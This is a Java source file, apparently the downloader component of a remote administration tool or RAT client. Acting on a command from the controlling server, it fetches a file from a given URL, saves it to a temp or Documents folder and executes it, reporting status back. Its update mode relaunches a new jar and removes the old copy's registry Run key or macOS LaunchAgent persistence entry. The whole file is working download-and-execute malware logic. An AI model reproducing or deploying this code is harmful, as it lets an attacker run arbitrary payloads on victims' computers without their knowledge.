package com.redpois0n;

import java.awt.Desktop;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.Random;

import com.redpois0n.common.os.OperatingSystem;
import com.redpois0n.packets.Header;

public class Downloader extends Thread {

	public String url;
	public boolean update;

	public Downloader(String url, boolean update) {
		this.url = url;
		this.update = update;
	}

	public void run() {
		try {
			Connection.status(Constants.STATUS_DOWNLOADING_FILE);

			URLConnection con = new URL(url).openConnection();

			String fileName = (new Random().nextInt()) + ".exe";

			String disposition = con.getHeaderField("Content-Disposition");

			if (disposition != null) {
				int index = disposition.indexOf("filename=");
				if (index > 0) {
					fileName = disposition.substring(index + 10, disposition.length() - 1);
				}
			} else {
				fileName = url.substring(url.lastIndexOf("/") + 1, url.length());
			}
			
			try {
				File file = null;
				if (update) {
					file = File.createTempFile(Main.name + (new Random()).nextInt(), ".jar");
				} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
					file = new File(System.getProperty("java.io.tmpdir"), fileName);
				} else {
					file = new File(System.getProperty("user.home") + "/Documents/" + fileName);
				}

				InputStream in = con.getInputStream();
				FileOutputStream fout = new FileOutputStream(file);
				
				byte data[] = new byte[1024];
				int count;
				while ((count = in.read(data, 0, 1024)) != -1) {
					fout.write(data, 0, count);
				}

				in.close();
				fout.close();

				if (update) {
					Connection.write(Header.DISCONNECT);
					try {
						Connection.socket.close();
					} catch (Exception ex) {
					}
					if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
						Runtime.getRuntime().exec(new String[] { System.getProperty("java.home") + "\\bin\\javaw.exe", "-jar", file.getAbsolutePath() });
					} else {
						Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath().replace(" ", "%20") });
					}
					try {
						if (System.getProperty("os.name").toLowerCase().contains("windows")) {
							WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Main.name);
						} else if (System.getProperty("os.name").toLowerCase().contains("mac")) {
							new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + Util.getJarFile().getName().replace(".jar", ".plist")).delete();
						}

					} catch (Exception ex) {

					}
					Main.running = false;
					System.exit(0);
				} else {
					if (fileName.toLowerCase().endsWith("jar")) {
						if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
							Runtime.getRuntime().exec(new String[] { System.getProperty("java.home") + "\\bin\\javaw.exe", "-jar", file.getAbsolutePath() });
						} else {
							Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath().replace(" ", "%20") });
						}
					} else if (fileName.toLowerCase().endsWith("exe")) {
						Runtime.getRuntime().exec(new String[] { file.getAbsolutePath() });
					} else {
						Desktop.getDesktop().open(file);
					}
					Connection.status(Constants.STATUS_EXECUTED_FILE);
				}
			} finally {

			}
		} catch (Exception ex) {
			Connection.status("Failed downloading: " + ex.getClass().getSimpleName() + ": " + ex.getMessage());
			ex.printStackTrace();
		}
	}

}
